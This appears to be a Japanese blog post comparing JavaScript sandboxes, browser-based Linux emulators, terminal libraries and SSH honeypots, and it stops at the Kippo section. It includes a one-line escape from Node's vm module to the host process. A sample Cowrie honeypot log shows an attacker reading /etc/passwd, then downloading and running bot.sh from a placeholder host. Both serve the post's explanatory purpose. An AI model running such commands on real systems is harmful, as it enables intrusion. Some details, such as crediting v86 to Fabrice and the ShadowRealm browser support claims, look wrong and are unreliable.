---
title: Linuxカーネル再現のJavaScript解を比べる
description: "JavaScriptやTypeScriptによるLinux環境再構成の深掘り分析。"
date: 2026-05-28
tags:
  - javascript
  - linux
  - analysis
authors:
  - fox3000foxy
author_pubkey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEoFS9I15CAZojXYc6NMqggEYGct9o9b3JnWdXWOtlzgs2lclmqw8adtWgXUeeBMRHvm5LoajQ+OcImaAyA8jwYA=="
author_sig: "Tp65+9vBL702mfa1iaGdUtSiivWqXQNTbEcYxOnfbXh+uxlcWllNX3ESbqS2ETGeWie+9Pp/IOnthZRbjYmgOA=="
---

# JSサンドボックス、エミュレータ、シミュレータ、Linuxハニーポット全部。比べた

いいか、もうこのウサギ穴には深く入りすぎた期間が長い。始まりは[typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)を手伝ってたことだ。Fortuneのプロジェクトだ（後で触れる）。「待って`v86`と何が違うの」とか「なんで`vm2`使わないの」とか聞かれ続けて、まず生態系全体を図にしないと明確に答えられないと気づいた。だからこうなったわけだ。

4つの違う系統があると分かる。JSサンドボックス、Linuxエミュレータ、Linuxシミュレータ、ハニーポットだ。同じ文で言及され続けても、ほぼ重ならない。プラグイン機構を作る人は`isolated-vm`を使う。CLI道具デモを作る人は`v86`を使う。SSH脅威情報をやる人はCowrieを使う。「箱でコード回す」の漠然傘の下でまったく違う問題を解いてる。

この記事書くのにソースコードもCVE報告も建築文書もnpmページもかなり読み込んだ。長くなるよ。コーヒー取って。本気で。2杯でも。

> 小 disclaimer：`typescript-virtual-container`はこの調査のきっかけだからこの記事で前に出す。残り全部には公平であろうとした。でもこの文脈は頭に入れといて。

---

## パート0。まず、君が本当に解く問題は何か

潜る前に、各系統の用途を正確にする価値がある。用語はすぐ散らかるし、みんな常に混ぜるからね（図にきちんと起こして座る前の私込みで）。

**JSサンドボックス**はホストNode.jsプロセスからJavaScriptコードを隔離する。脅威モデルはこうだ。`process.exit()`を呼んだり、ファイル読んだり、子プロセス起こしたりする信用できないJSコードだ。解はV8実行への境界だ。この道具にLinuxシェルも権限付きファイルシステムもSSHもない。

**Linuxエミュレータ**はJavaScriptかWebAssembly実装のCPUエミュレータ（x86、RISC-V、OR1K）で本物の無改造Linuxカーネルを回す。本物OSを起動する。本物のシステムコールが出る。x86向けコンパイル済みプログラムとのバイナリ互換が出る。資源コストは巨大だ。

**Linuxシミュレータ**は本物カーネル回さず*Linux系システムの挙動*を真似る。シェル解釈器と仮想ファイルシステムと、プログラムも人間も騙すに足るUnix意味を実装する。カーネルなし、Wasmなし、CPUエミュなしだ。かなり軽い。

**ハニーポット**は攻撃者を引き付けて行動記録するために設計される。主に実行環境じゃない。観測道具だ。Linux本物への忠実度は、攻撃者が罠を検出しない範囲でのみ大事だ。

この枠組みで、この記事の各プロジェクト位置はこうだ。

```
JS sandbox :       vm、vm2、isolated-vm、quickjs-emscripten、Deno Workers、ShadowRealm
Linuxエミュレータ:  v86、JSLinux/TinyEMU、jor1k、CheerpX、WebContainers、container2wasm
Linuxシミュレータ: typescript-virtual-container（この領域で唯一）
Honeypot :         Cowrie、Kippo、Lyrebird、endlessh、sshesame、node-simple-ssh-honeypot
端末 stack：       xterm.js + node-pty（隔離じゃないけど関連）
```

---

## パート1。JavaScriptサンドボックス

### 1.1 `vm`。Node.js内蔵モジュール（思ってるものじゃない）

Nodeで「信用できないJSを実行する」への最古の答えは内蔵`vm`モジュールだ。v0.1からある。だから多くの人が最初に使って、火傷する。

```js
const vm = require("vm");
const sandbox = { answer: 0 };
vm.createContext(sandbox);
vm.runInContext("answer = 6 * 7", sandbox);
console.log(sandbox.answer); // 42
```

`vm`が実際にやること：新しいV8コンテキストを作る（ネイティブコンストラクタの新集合、`Object`や`Array`や`Function`など）。コードをそこで実行する。`sandbox`に入れたものへの共有参照付きだ。V8エンジンは変わらない。プロセスは変わらない。メモリは共有だ。

`vm`が安全を提供しない理由：JavaScriptのプロトタイプ連鎖は全部を`Object.prototype`に繋ぐDAGだ。ホスト世界物をサンドボックスに入れたら、客はプロトタイプ連鎖を登ってホストコンストラクタに届く。`Function`からは`Function("return process")()`を呼んで本物`process`を取れる。ゲームオーバーだ。即だ。

```js
// vmでは完璧に動く。本物processが取れる
vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
```

言っとくけど、Node.js文書自体がこう言う。「vmモジュールは安全機構じゃない。信用できないコード実行に使うな」ってね。この警告は昔からある。人々は常に無視する。本番アプリが`vm`をサンドボックスに使うの見た。やめてくれ。

**判定**：スコープ機構で、サンドボックスじゃない。変数隔離が要るとき使う（テンプレエンジン、制御コード向け`eval`風機能）。信用できない入力には絶対使わない。

**メモリ**：無視できる追加。ホストプロセスと同じV8ヒープ。  
**安全**：やる気ある攻撃者にゼロだ。

---

### 1.2 `vm2`。コミュニティの試みと、とても長い死

`vm2`は`vm`脱出問題へのコミュニティの答えだった。中心発想：サンドボックス境界を越える各物を`Proxy`で包んで、プロパティアクセスを横取りして、プロトタイプ遡りを止めて、危険参照を濾過する。賢い発想だ理論上！実際はご覧の通り説得力はかなり低かった。

```js
const { VM } = require("vm2");
const vm = new VM({ timeout: 1000, sandbox: {} });
vm.run("process.exit(1)"); // VMErrorを投げる、processは触れない
```

数年はかなり動いた。でも`Proxy` JavaScriptの攻撃面は巨大だ。新しいJS言語機能ごと、ジェネレータ、非同期イテレータ、`Symbol.toPrimitive`、`Error.prepareStackTrace`、`Promise`内部スロットは潜在回避ベクトルだ。

CVE年表はこうだ。なんというか、これ見て。

| 日付 | CVE | 仕組み |
|------|-----|-----------|
| 2022年10月 | CVE-2022-36067 | `Error.prepareStackTrace`経由のホスト文脈脱出 |
| 2023年4月 | CVE-2023-29017 | 未処理非同期エラー経由のホスト物漏れ |
| 2023年4月 | CVE-2023-29199 | `handleException()`経由の例外消毒回避 |
| 2023年4月 | CVE-2023-30547 | `Proxy.getPrototypeOf`から`Function`からRCE |
| 2023年5月 | CVE-2023-32314 | `Error.name`上の`Proxy`から`Function`からRCE |
| 2023年7月 | CVE-2023-37466 | 非同期関数とスタック溢れと`Proxy.getPrototypeOf` |
| 2023年7月 | CVE-2023-37903 | ワーカースレッドとeval脱出 |

同じ月（2023年4月）に重大CVE 3つだ。3つだ。1か月でだ。CVE-2023-37903後、メンテナは公式にライブラリを非推奨化した。メッセージはこうだ。*「このライブラリは重大な安全問題を含み、本番で使うべきじゃない」*。

メンテナは2025年10月に版3.10.0で蘇らせた。当時既知のものは全部直したと称してね。新しい重大脱出（CVE-2026-22709、CVSS 9.8）が2026年1月に開示されて、2026年5月に11連発が続いた。11だ。模様は変わってないし正直いつか変わるとは思わない。

根本問題は建築的だ。全生態系が学ぶのに時間かかった教訓だ。隔離するのと同じ言語で、同じエンジンで、同じプロセス内で安全サンドボックスは作れない。脱出面はV8実装全体だ。V8は常に変わる数百万行C++だ。新JS機能ごとに新しい攻撃路が開きうる。

**判定**：安全敏感な用途に使うな。最新版でも数か月ごとに新回避が見つかる。メンテナ自身が公然と認めた。

---

### 1.3 `isolated-vm`。本当に動くやつ

`isolated-vm`は正しい手法を取る。V8ネイティブ隔離基本要素、Isolateを使う。各V8 Isolateは独自ヒープ、独自ガベージコレクタ、独自ネイティブ集合を持って、他Isolateと共有参照ゼロだ。

Chromeがタブ間で使うのと同じ境界だ。本物安全壁だ。Proxy土台の言語技じゃない。

```js
import ivm from "isolated-vm";

// 各isolateは独自V8ヒープ
const isolate = new ivm.Isolate({ memoryLimit: 64 }); // MB上限
const context = await isolate.createContext();
const jail = context.global;

// 境界越しにデータ渡すには明示直列化が要る
await jail.set("sensitiveData", "not this");
await jail.set("log", new ivm.Reference(console.log));

const script = await isolate.compileScript(`
  // ホストプロセスもホストヒープもホストモジュールも触れない
  log.applySync(undefined, ["hello from the isolate"]);
`);
await script.run(context);

// 時間切れやメモリ上限で強制的終了できる
isolate.dispose(); // ヒープ全部解放
```

`Reference`と`ExternalCopy`型が明示通信橋だ。`Reference`はisolateにホスト関数への呼び出し可能 handle を渡す。isolateは呼べるけど閉鎖もプロトタイプも調べられない。`ExternalCopy`は値直列化する（ヒープ境界越しの構造化クローン）。この明示橋モデルは不便だけど、隔離を本物にするものだ。

厳密な資源上限を付けられる。メモリ（超えたらisolate終了）、壁時計時間切れ、CPU時間切れだ。終了は本物だ。V8 Isolate全体を殺す。`while(true)`で回避できるJS時間切れじゃない。

**限界**：JS専用だ。中でbashは実行できない。ファイルも権限も網もプロセスもない。ユーザー提出JS（プラグイン、式、スクリプト hook ）にはまさに正しい道具で、残り全部には間違った道具だ。`typescript-virtual-container`作者は最初検討したと述べて、「シェル命令を実行する」と「JavaScriptを隔離する」は根本違う問題だと気づいた。

**メモリ**：空isolateあたり約3-10MB、ヒープ使用で増える。  
**安全**：堅い。V8 Isolate境界は本物隔離基本要素だ。  
**npm**：[isolated-vm](https://www.npmjs.com/package/isolated-vm)  
**GitHub**：[laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)

---

### 1.4 `quickjs-emscripten`。Wasmコンパイルの別JSエンジン

違う手法：V8内で隔離する代わり、WebAssemblyコンパイルの完全別JavaScriptエンジンを回す。ホストはV8やNodeで回る。客はWasm内QuickJSで回る。Wasmサンドボックスが隔離境界を出す。

QuickJSはFabrice Bellardのまだ別の作品だ（QEMU、FFmpeg、JSLinux、TinyEMUの人。この人本物じゃない。真面目に1人でどうやって全部やるの）。ES2023準拠の小JSエンジンでC書きだ。Wasmコンパイルで約500KBだ。

```js
import { getQuickJS } from "quickjs-emscripten";

const QuickJS = await getQuickJS();
const vm = QuickJS.newContext();

const result = vm.evalCode(`
  // V8と完全分離のQuickJSで実行
  (function() { return 6 * 7; })()
`);

if (result.error) {
  console.log("Error:", vm.dump(result.error));
  result.error.dispose();
} else {
  console.log("Result:", vm.dump(result.value)); // 42
  result.value.dispose();
}

vm.dispose();
```

QuickJSはES2023準拠の小JavaScriptエンジンでC書きだ。Wasmコンパイルで同期版約500KB、非同期版（Asyncify）約1MBだ。メモリ管理は手動だ。VMから取り出す各値は明示解放しなきゃいけない。ちょっと面倒だが境界越しGC驚きを防ぐ。面白い交換だ！

`@sebastianwessel/quickjs`ラッパーは上に使いやすいAPIを足す。任意仮想ファイルシステム、fetch対応、Node.jsモジュール stub 付きだ。

```ts
import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
import { loadQuickJs } from "@sebastianwessel/quickjs";

const { runSandboxed } = await loadQuickJs(variant);

const result = await runSandboxed(
  async ({ evalCode }) => evalCode(`
    import { join } from 'path';
    export default join('src', 'dist');
  `),
  { allowFs: false, allowFetch: false }
);
```

安全モデルは`isolated-vm`と違う。Wasm線形メモリモデルで客はV8ヒープ物に直接触れない。攻撃面はホストとWasm間インターフェース（importやexport）で、JS言語全体じゃない。Proxy土台サンドボックスより堅いと一般に見られる。

裏：QuickJSはV8並みに最適化されてない。CPU bound JS負荷ではV8より5-20倍遅い。小さいコード片や信用できない評価にはふつう問題にならない。

**メモリ**：Wasmモジュール約500KBとインスタンスごとヒープ。  
**安全**：Wasm境界。Proxy手法より堅いとみなされる。  
**npm**：[quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten)、[@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)  
**GitHub**：[justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)

---

### 1.5 Deno。権限優先のランタイム

Denoはまったく違う哲学を取る。Node内でサンドボックスする代わり、デフォルト安全な新ランタイムを作る。この手法ほんと好きだ。Node.jsが最初からこうあるべきだったものだ。Ryan Dahl（元Node.js作者）は文字通りNode.js設計決定の後悔でDenoを作った。考えるとかなりすごい。

各敏感能力（ファイル読み、ファイル書き、網、環境、子プロセス）は明示`--allow-*`フラグが要る。

```bash
# /data内だけ読める
deno run --allow-read=/data script.ts

# 1ドメインだけ触れる
deno run --allow-net=api.example.com script.ts

# フラグなしは権限ゼロ
deno run untrusted.ts # 読みも書きも網も起動もできない
```

権限モデルはRustやOS水準で実装される。JS技じゃない。Denoコードが`Deno.readFile()`を呼ぶと、ファイルシステム触る前に権限表を確認するRust演算を通る。JSから回避できない。権限なければシステムコールは起きない。

本当に信用できないコード実行には、Deno Workers（Web Workers）が同プロセス内の第二isolateを出し、各々独自権限集合を持つ。権限ゼロワーカーを起動して`postMessage`で通信できる。

Deno 2（2024年10月発売）は完全npm互換とNode.js互換 shim を足して、サーバー側用途の採用をかなり上げた。

**交換**：Deno安全モデルは部分的信用コードには優れる。完全信用できない敵対的コードには権限モデルは助けない。Isolate境界（`isolated-vm`）か違うエンジン（`quickjs-emscripten`）が要る。DenoもV8使うし、洗練攻撃者はV8水準バグを見つけるからね。

---

### 1.6 TC39 ShadowRealm。標準化された答え（いつか）

JavaScript標準化団体（TC39）にはShadowRealmって提案があって、`vm`や`vm2`がやろうとしたことを正しい安全モデルで標準化しようとしてる。ShadowRealmは隔離JS実行文脈を作る。独自 intrinsics、外部世界アクセスなし、丁寧管理 import や export インターフェースだ。

```js
const realm = new ShadowRealm();
const result = realm.evaluate(`
  // 分離 intrinsics、外部世界アクセスなし
  typeof globalThis.fetch // "undefined"
  6 * 7 // 42
`);
```

ShadowRealmはブラウザで利用可能だ（Chrome 90+、Firefox 105+）。でも2026年時点で安定Node.jsにはまだない。TC39 Compartments提案はその上にモジュール水準隔離を組む。長期の標準化答えだが、サーバー側Node本番にはまだ早い。遠くに見える工事でね。でもまだそこじゃない。TC39あるあるだ。

---

### サンドボックス系統まとめ

| | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
|---|---|---|---|---|---|
| **隔離境界** | なし（スコープ） | Proxy（破綻） | V8 Isolate | Wasm | V8 IsolateとRust権限 |
| **メモリ上限** | ❌ | ❌ | ✅ 厳密上限 | ✅ Wasmヒープ | 部分的 |
| **CPU時間切れ** | ❌ | ✅（回避可能） | ✅ 厳密 | ✅ | ✅ |
| **安全** | なし | 壊れた | 堅い | 堅い | 堅い |
| **JS速度** | ネイティブV8 | ネイティブV8 | ネイティブV8 | 約10倍遅い | ネイティブV8 |
| **ブラウザ** | ❌ | ❌ | ❌ | ✅ | ❌ |
| **Node互換** | ネイティブ | ✅ | ✅ | 部分 shim | 部分的 |
| **状態** | 安定 | 危険（新CVE） | ✅ 活性 | ✅ 活性 | ✅ 活性 |
| **RAM追加** | 約1MB | 約5-20MB | 約3-10MB | 約5-15MB | 約10-30MB |

判定：安全が大事なら、本物選択肢は正確に2つだ。`isolated-vm`（ネイティブ拡張、V8 Isolate、全速JS）と`quickjs-emscripten`（Wasm、ブラウザ対応、計算集約で約10倍遅い）だ。残り全部は「やめてくれ」(`vm`、`vm2`)か違う問題を解くランタイム（Deno）だ。ShadowRealmはいつか流れを変えるかも。でもまだじゃない。

---

## パート2。JavaScriptのLinuxエミュレータ

ここから私には本当に面白くなる。ここは*本物*エミュレータだ。JavaScriptかWebAssemblyで命令集合を実装して、本物Linuxカーネル image を起動して、本物ユーザー空間バイナリを実行する。隔離は客とホストが何も共有しないことから来る。違うメモリ空間、違う命令流だ。

代償は巨大だ。でも得るものは本当に驚異的だ。本物Linuxが、本当に回る。ブラウザやNodeプロセス内でね。考えるとかなりすごいよね。

### 2.1 `v86`。JSとJIT Wasmのx86 PCエミュレータ

`v86`はFabrice（GitHubのcopy）作でJavaScript最強のオープンソースx86エミュレータだ。2013年頃純JS解釈器として始まって、x86基本ブロックを実行時にWebAssemblyへ翻訳するJIT制へ進化して、性能がかなり上がった。

エミュレートするのはこうだ。
- **CPU**：x86-32（IA-32）、だいたいPentium 1水準の命令集合。64ビット（x86-64）は除外のまま。これは機能欠落じゃなくハード建築限界だ。
- **FPU**：JavaScript `Float64Array`経由だ。x87は80ビット拡張精度。JS double は64ビットだ。つまり浮動小数点結果は本物CPUと微妙に違うことがある。
- **メモリ**：設定可能で、JSヒープ内`SharedArrayBuffer`か`ArrayBuffer`に対応付ける。
- **ハード**：8254 PIT（タイマー）、8259 PIC（割り込み管理）、8042キーボード管理（PS/2）、CMOS RTC、SVGAとBochs VBE拡張付きVGA、IDE管理、フロッピー管理（8272A）、NE2000網カードだ。
- **BIOS**：SeaBIOS（オープンソースx86 BIOS）を使う。

JITは基本ブロック（跳びなしx86命令並び）特定して、WebAssembly関数へ翻訳して、キャッシュして、同じブロック次実行時に呼ぶ。熱いコード道はネイティブWasm性能になる。冷たい道はJS解釈器に戻る。

```js
import { V86 } from "v86";
import { readFileSync } from "fs";

const emulator = new V86({
  bios:    { buffer: readFileSync("./bios/seabios.bin") },
  vga_bios:{ buffer: readFileSync("./bios/vgabios.bin") },
  hda:     { buffer: readFileSync("./images/alpine.img"), async: false },
  memory_size: 128 * 1024 * 1024, // 128MB
  autostart: true,
});

// カーネル串行出力を取る（Linuxカーネル出力）
emulator.add_listener("serial0-output-byte", byte => {
  process.stdout.write(String.fromCharCode(byte));
});

// 客へ入力を送る（シェルに入力）
emulator.serial0_send("ls /\n");
```

**対応OS**：Alpine Linux（優秀）、Ubuntu 16.04/18.04（i386のみ）、Arch Linux 32、ReactOS、FreeDOS、Windows 9x/2000（留保付き）、MS-DOSだ。

**起動時間**：クリーン image からAlpine Linuxで15-40秒だ。本物カーネル初期化に固有だ。飛ばせない。そう、ユーザーはブラウザでLinuxカーネル起動を見る。取引だ。

**最小メモリ**：インスタンスあたり100-256MBだ。Wasm JITコードキャッシュだけで占有Linuxインスタンス数十MBになりうる。

**Node.js利用**：完全対応だ。DOMは不要のまま。VGA出力は串行出力だけ要るなら無視できる。

**できないこと**：64ビットバイナリ実行、現代カーネル機能利用（eBPF、io_uringなど）、数インスタンス超の同時実行（メモリ上限に当たる）。

**npm**：[v86](https://www.npmjs.com/package/v86)。継続更新で、私が書く同日に最新公開。  
**GitHub**：[copy/v86](https://github.com/copy/v86)  
**デモ**：[copy.sh/v86](https://copy.sh/v86)

---

### 2.2 JSLinuxとTinyEMU。Bellardの仕事、2回分

JSLinuxはFabrice Bellard自作のJavaScript Linuxエミュレータだ。最初で2011年公開だ。この記事でBellardに言及し続けるのは現れ続けるからだ。QuickJS、TinyEMU、JSLinux、QEMU、FFmpeg。この人は別物だ。誇張なくソフトウェア史上いちばん印象的な個人技術貢献の1つだ。

元JSLinuxは純x86 JS解釈器だった。2016年、BellardはTinyEMU（C書きRISC-Vエミュレータ）を書いて、Emscripten経由でJavaScriptへコンパイルした。今JSLinuxの土台になった。だから今JSLinuxは実際、手書きJSじゃないCが生成するJavaScriptだ。

Bellardサイトの技術 note は読む価値ある。今JSLinuxは32か64ビットRISC-V CPU（x86じゃない）を回して、VirtIOコンソール、VirtIO網、VirtIOブロック装置、ホストとファイル共有用9Pファイルシステムをエミュレートする。JSデモはEmscripten使ってCからコンパイルされる。手書きJSじゃない。

TinyEMU自体はこう対応する。
- RISC-V RV32IMAFDQCとRV64IMAFDQC（32と64ビット、浮動小数点、乗算、圧縮命令）
- KVM経由x86（ネイティブのみ、エミュなし。だからJS版はRISC-Vのみ）
- VirtIOコンソール、網、ブロック、入力、9Pファイルシステム

TinyEMUはEmscripten経由のJavaScriptデモ付きだ。JSLinuxの土台で、`container2wasm`も使う（2.5節参照）。

**JSLinux状態**：npmパッケージなし、プログラム可能APIなし。ブラウザで開くデモだ。歴史重要性は大きい。概念を証明した。ライブラリとしての実用性：ゼロだ。

**TinyEMU**：npmになし、Cソースは[bellard.org/tinyemu](https://bellard.org/tinyemu/)にある。

---

### 2.3 jor1k。OR1Kエミュレータ

jor1kはSebastian Macke書きのJavaScript製OpenRISC 1000（OR1K）エミュレータだ。歴史的に面白い。jor1kがVirtIO 9Pファイルシステム対応を導入して、BellardがTinyEMUとJSLinuxに取り込んだからだ。このプロジェクト間の受粉は密だ。互いに発想を借り合う。オープンソースエミュ仕事のいちばん素敵なところの1つだ正直。

**状態**：もう活性保守なし、npmパッケージなし。現時点で保存だ。歴史文脈用に知る価値あるだけだ。会話でjor1kが出たら、今は分かるってことだ :)

---

### 2.4 CheerpX。ブラウザ用商用x86エミュレータ

Leaning Technologies製CheerpXは製品級の商用Linux x86エミュレータだ。オープンソースじゃない。でも本物DebianやUbuntuユーザー空間を回すにはv86よりかなり有能だ。ブラウザで本物VSCodeが要るならこれだ。

v86との主要違い：
- 広いISA対応（広いx86拡張、良いglibc互換）
- ブラウザ内IndexedDB基準のファイルシステム（ページ再読み込み間で永続）
- `SharedArrayBuffer`経由のpthread対応（COOPやCOEPヘッダー要。うん面倒な安全ヘッダー）
- 本物VSCode、Python、Node.js、他実アプリを回す設計。最小OS image じゃない
- 専門対応とSLAあり（壊れたら怒れる相手がいる）

典型用途は「サーバーなしでブラウザに本物Linuxアプリを回す」ことだ。企業はブラウザ基準IDE、コーディング教程、対話文書に使う。

```js
// CheerpX API（簡略）
const cx = await CheerpX.Linux.create({
  mounts: [{ type: "ext2", path: "/", dev: CloudDevice.create(...) }],
});
await cx.run("/bin/bash");
```

**Node.js話**：CheerpXはまずブラウザ向け設計だ。土台エミュレータは理論上Nodeで動く（Wasmだ）。でもAPIも文書も完全ブラウザ利用志向だ。サーバー側利用は非対応だ。

**メモリ**：v86同様。本物Debianインスタンス200MB超。  
**価格**：オープンソースプロジェクト無料、本番SaaS商用ライセンス。  
**文書**：[cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)

---

### 2.5 WebContainers（StackBlitz）。WasmのNode.jsで、Linuxエミュじゃない

WebContainersはLinuxエミュレータと同じ袋に入れられがちだが建築が違う。x86エミュしない。Linux起動しない。WASI使ってWebAssemblyコンパイルのNode.jsを回す。この区別は大事だ。混乱して無駄に時間使った。

混乱は売り文句から来ると思う。「ブラウザでNode.jsを回す」はエミュっぽく聞こえる。でも実際、WASI内で動く特定カスタムランタイムをコンパイルしたNode.js自体で、VM内エミュLinuxでNode.jsを回すんじゃない。まったく違う2建築だ。

建築：
1. Node.jsはWasmコンパイルされる（特定カスタムWASIランタイム）
2. Service WorkerがエミュNode.jsサーバーの網リクエストを横取りしてブラウザタブへ振る
3. ファイルシステムはブラウザメモリ内（ディスクI/Oなし）
4. npmはブラウザ利用最適の自作実装だ

本物Node.js（Wasmコンパイル）を回すから、本物npm、本物Node.js API、本物モジュール解決が出る。汎用Linuxユーザー空間は出ない。`apt`で system パッケージ入れられないし、任意コンパイルバイナリ実行できないし、Node.js生態系外では大したことできない。

**ブラウザ前提**：SharedArrayBuffer（COOPやCOEPヘッダー要）、Service Worker対応、現代Wasmだ。

**Node.js話**：ブラウザ利用専用設計だ。APIはブラウザ文脈外で動かない。

**npm**：[@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)  
**文書**：[webcontainers.io](https://webcontainers.io)

---

### 2.6 container2wasm。WasmコンパイルのDockerコンテナ

`container2wasm`は道具だ（npmパッケージじゃない）。NTT製でDockerコンテナ image をWebAssemblyバイナリへ変換する。任意Wasmホスト（ブラウザ込み）で回る。初めて見たとき本当に動くとは信じなかった。

仕組み：
- x86_64コンテナ用：Bochs（Wasmコンパイルのx86エミュレータ）とコンテナ root ファイルシステムを埋め込む
- riscv64コンテナ用：TinyEMU（またBellard！）とコンテナ root ファイルシステムを埋め込む
- 結果`.wasm`ファイルはエミュレータ起動して、コンテナファイルシステムを載せて、コンテナ入口点を実行する

```bash
# Ubuntu 22.04コンテナをWasmへ変換
c2w ubuntu:22.04 out.wasm

# 実行
wasmtime out.wasm uname -a
# Linux 5.15.0 #1 SMP riscv64 GNU/Linux

# ブラウザ利用に出す
c2w --to-js ubuntu:22.04 /tmp/htdocs/
```

結果`.wasm`は巨大だ。最小Ubuntuで数百MBだ。でも完全自立だ。`.wasm`をメールで誰かに送ればブラウザでUbuntu回せる。この文は意味不明なはずなのに現状こうだ。

**GitHub**：[container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)

---

### エミュレータ系統まとめ

| | `v86` | JSLinux/TinyEMU | jor1k | CheerpX | WebContainers | container2wasm |
|---|---|---|---|---|---|---|
| **建築** | x86-32 JITからWasm | RISC-V (Wasm) | OR1K (JS) | x86（非公開） | Node.jsからWasm/WASI | x86/RISC-V (Wasm) |
| **本物カーネル** | ✅ | ✅ | ✅ | ✅ | ❌ (Node.js) | ✅ |
| **64ビット** | ❌ | ✅ (RISC-V) | ❌ | ✅ | 該当なし | ✅ |
| **npmパッケージ** | ✅ | ❌ | ❌ | CDN/API | ✅ | ❌ (CLI道具) |
| **Node.js利用** | ✅ | ❌ | ❌ | ❌ | ❌（ブラウザのみ） | Wasmtime経由 |
| **ブラウザ利用** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| **RAM/インスタンス** | 150-256MB | 約64-128MB | 約64MB | 200MB超 | 約100MB | 約200-500MB |
| **起動時間** | 15-40秒 | 10-30秒 | 10-30秒 | 15-40秒 | 2-5秒 | 10-40秒 |
| **オープンソース** | ✅ | ✅ | ✅ | ❌ | 部分的 | ✅ |
| **状態** | ✅ とても活性 | ✅ 安定 | ⚠️ 保存 | ✅ 商用 | ✅ 活性 | ✅ 活性 |

この表で目立つこと：`v86`はnpmパッケージで、ブラウザとNode両方で回って、オープンソースな唯一だ。だから「JavaScript Linuxエミュレータ」会話を支配する。残り全部に欠点がある。JSLinuxはAPIなし、jor1kは保存、CheerpXは金がかかる、WebContainersはブラウザのみNode専用、container2wasmは build 段階とCLIが要る。「JavaScriptでLinux起動する」だけなら、`v86`はほぼつねに正しい出発点だ。

---

## パート3。端末 stack：xterm.jsとnode-pty

シェル風体験を作るとき常に出る2パッケージだ。サンドボックスでもエミュレータでもない。UIとPTY配管だ。でも関連深いから外すのは気が引けた。あと両方使ったことあって本当に良い。

### 3.1 `xterm.js`。端末レンダー

xterm.jsはブラウザ用端末エミュレータだ。`<canvas>`要素に端末画面（VT100やxterm逃避並び）を表示して、キー入力扱って、データを回すAPIを出す。

使うのはこうだ。VS Code内蔵端末、Azure Cloud Shell、Proxmox VE、AWS CloudShell、その他いろいろだ。

```js
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";

const term = new Terminal({ cursorBlink: true });
const fitAddon = new FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById("terminal"));
fitAddon.fit();

// 端末へデータ送信（テキスト表示）
term.write("$ ");
term.onData(data => {
  // dataは打鍵。backendへ送る
  socket.send(data);
});
socket.onmessage(msg => {
  // backend出力。表示する
  term.write(msg.data);
});
```

xterm.jsはレンダー層だけだ。シェル実行しない。命令解釈しない。選ぶ backend へ繋ぐ表示 widget だ。xterm.jsが「端末をやる」と思う人は多い。でも本当は画面だけだ。実際に命令を実行する何かに繋がなきゃいけない。

**npm**：[@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)  
**GitHub**：[xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)

---

### 3.2 `node-pty`。PTY作成

`node-pty`はNode.jsで擬似端末（PTY）を作って読み書き handle を渡す。xterm.jsと使えば、サーバーで回る本物シェル（bash、zsh、fish）と話すブラウザ端末を作れる。

```js
import * as pty from "node-pty";

const shell = pty.spawn("bash", [], {
  name: "xterm-color",
  cols: 80,
  rows: 30,
  cwd: process.env.HOME,
  env: process.env,
});

shell.onData(data => {
  // WebSocket経由でブラウザxterm.jsへ送る
  ws.send(data);
});

ws.on("message", data => {
  // ブラウザ打鍵をシェルへ伝える
  shell.write(data);
});
```

クラウドIDEとウェブ端末の標準図式だ。xterm.js（ブラウザ）とWebSocketとnode-ptyと本物bashだ。隔離は存在しない。シェルはNode.jsプロセス（や起動ユーザー）の全権限で実行する。

**保守**：Microsoft。  
**npm**：[node-pty](https://www.npmjs.com/package/node-pty)  
**GitHub**：[microsoft/node-pty](https://github.com/microsoft/node-pty)

---

## パート4。SSHハニーポット

ハニーポットは攻撃されるために設計される。目標は攻撃者がやり取りするくらい本物に見せて、脅威情報用に全部記録することだ。SSHは主標的だ。ネットでいちばん攻撃されるサービスだからだ。公開IPで22番を開けたら文字通り数分で自動走査試行が見える。いつか試して。来る速さがかなり怖いくらいだ。

ハニーポット品質は2つで測る。**忠実度**（本物 system をどれだけ説得力真似るか）と**測定**（どれだけ有用データ取るか）だ。両者は緊張する。高忠実ハニーポットは作り難く運用も危ない。

この節が結局`typescript-virtual-container`に`HoneyPot`モジュール作るに至らせた。だからいくつか意見がある。

### 4.1 Cowrie。黄金律

CowrieはPython製の中高対話SSHとTelnetハニーポットだ。研究と安全コミュニティでいちばん配備されるSSHハニーポットだ。

建築：
- **protocol 層**：本物SSH protocol 実装（Twisted Conch）。攻撃者は本物の握手、本物鍵交換、本物認証を得る
- **シェル層**：偽ファイルシステム（Debian 5.0風）と部分的シェル解釈器でよくある命令に応答する
- **proxy モード**：後ろの本物 system へ向けられる（高対話モード）。通るもの全部記録する
- **LLMモード**（最近追加）：扱えない命令へ動的応答を作る言語モデルを使う。そう、Cowrieは今AIモード持ちだ。狂った時代に生きてる。

```python
# Cowrieが取るもの
{
  "timestamp": "2024-01-15T03:22:11.847Z",
  "src_ip": "45.33.32.156",
  "username": "root",
  "password": "123456",
  "session": "abc123",
  "commands": [
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious.example/bot.sh",
    "chmod +x bot.sh",
    "./bot.sh"
  ],
  "files_downloaded": ["bot.sh"]
}
```

Cowrieは落としたファイル（wgetやcurlやSFTPやSCP経由）をマルウェア分析用に保存する。Splunk、Elasticsearch、他SIEMプラットフォームと統合する。

**忠実度**：中高だ。自動ボット騙すに十分説得力ある（SSH攻撃者の99パーセントはこれだ。大半は`root`や`password`を試すただの馬鹿スクリプト）。洗練人間は指紋取りできるけど、ふつうかなり速い。

**言語**：Python (Twisted)  
**GitHub**：[cowrie/cowrie](https://github.com/cowrie/cowrie)

---

### 4.2 Kippo。Cowrieの前身

